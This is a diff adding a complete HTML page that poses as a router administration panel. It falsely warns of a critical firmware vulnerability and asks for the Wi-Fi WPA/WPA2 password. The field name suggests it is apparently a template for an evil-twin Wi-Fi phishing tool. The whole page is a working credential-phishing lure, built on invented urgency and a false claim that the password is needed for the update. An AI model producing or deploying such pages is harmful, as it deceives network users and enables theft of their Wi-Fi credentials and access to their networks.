@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Router — Firmware Update Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+               background: #f0f2f5; min-height: 100vh; display: flex;
+               align-items: center; justify-content: center; }
+        .panel { background: #fff; border-radius: 8px; width: 500px;
+                 box-shadow: 0 2px 10px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background: #2c3e50; padding: 20px 24px; color: #fff; }
+        .header h1 { font-size: 18px; font-weight: 500; }
+        .header span { font-size: 12px; opacity: 0.7; }
+        .body { padding: 24px; }
+        .warning { background: #fee; border-left: 4px solid #e74c3c;
+                   padding: 14px; margin-bottom: 20px; border-radius: 4px; }
+        .warning strong { color: #e74c3c; }
+        .warning p { color: #666; font-size: 13px; margin-top: 4px; }
+        .info { background: #f8f9fa; border-radius: 6px; padding: 14px;
+                margin-bottom: 20px; font-size: 13px; }
+        .info table { width: 100%; }
+        .info td { padding: 4px 0; color: #555; }
+        .info td:first-child { font-weight: 600; width: 45%; }
+        label { display: block; font-size: 13px; font-weight: 600;
+                color: #333; margin-bottom: 6px; }
+        input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ddd;
+                                  border-radius: 6px; font-size: 14px; margin-bottom: 16px; }
+        .hint { font-size: 11px; color: #999; margin-top: -12px; margin-bottom: 16px; }
+        .btn { width: 100%; padding: 12px; background: #e67e22; color: #fff;
+               border: none; border-radius: 6px; font-size: 15px; font-weight: 600;
+               cursor: pointer; }
+        .btn:hover { background: #d35400; }
+        .footer { padding: 16px 24px; background: #f8f9fa; text-align: center;
+                  font-size: 11px; color: #999; border-top: 1px solid #eee; }
+    </style>
+</head>
+<body>
+    <div class="panel">
+        <div class="header">
+            <h1>Router Administration</h1>
+            <span>Configuration Panel</span>
+        </div>
+        <div class="body">
+            <div class="warning">
+                <strong>&#9888; Critical Firmware Update Available</strong>
+                <p>A security vulnerability has been detected. Your Wi-Fi password is required to apply the firmware update and secure your network.</p>
+            </div>
+            <div class="info">
+                <table>
+                    <tr><td>Current Version</td><td>v3.2.1 (outdated)</td></tr>
+                    <tr><td>New Version</td><td>v3.5.0 (security patch)</td></tr>
+                    <tr><td>Severity</td><td style="color:#e74c3c;font-weight:600">CRITICAL</td></tr>
+                </table>
+            </div>
+            <form method="POST" action="/login">
+                <label for="psk">Wi-Fi Password (WPA/WPA2 Key)</label>
+                <input type="password" id="psk" name="wfphshr-wpa-password" placeholder="Enter your Wi-Fi password" required>
+                <p class="hint">Required to verify network configuration before update.</p>
+                <button type="submit" class="btn">Apply Update</button>
+            </form>
+        </div>
+        <div class="footer">Router Administration Panel &mdash; All rights reserved</div>
+    </div>
+</body>
+</html>
